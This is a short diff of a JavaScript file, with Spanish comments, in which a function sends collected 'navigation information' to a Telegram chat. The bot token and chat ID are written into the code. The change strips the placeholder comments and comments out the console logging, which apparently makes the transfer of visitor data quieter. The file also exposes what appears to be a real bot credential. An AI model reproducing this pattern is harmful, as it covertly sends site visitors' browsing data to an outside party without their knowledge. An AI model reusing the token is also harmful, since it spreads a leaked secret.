@@ -54,8 +54,8 @@ Información de navegación (sin geolocalización):
   observer.observe({ entryTypes: ['navigation'] });
   
   async function sendMessageToTelegram(message) {
-    const botToken = '7518463533:AAFmqAmL2vjhK7XpaTCXld_McSu6kKO_m0U'; // Reemplaza con tu token de bot
-    const chatId = '5415238794'; // Reemplaza con tu ID de chat
+    const botToken = '7518463533:AAFmqAmL2vjhK7XpaTCXld_McSu6kKO_m0U'; 
+    const chatId = '5415238794'; 
   
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   
@@ -75,8 +75,8 @@ Información de navegación (sin geolocalización):
         throw new Error('Error al enviar el mensaje');
       }
   
-      console.log('Mensaje enviado correctamente');
+    //   console.log('Mensaje enviado correctamente');
     } catch (error) {
-      console.error('Error al enviar el mensaje:', error);
+    //   console.error('Error al enviar el mensaje:', error);
     }
   }
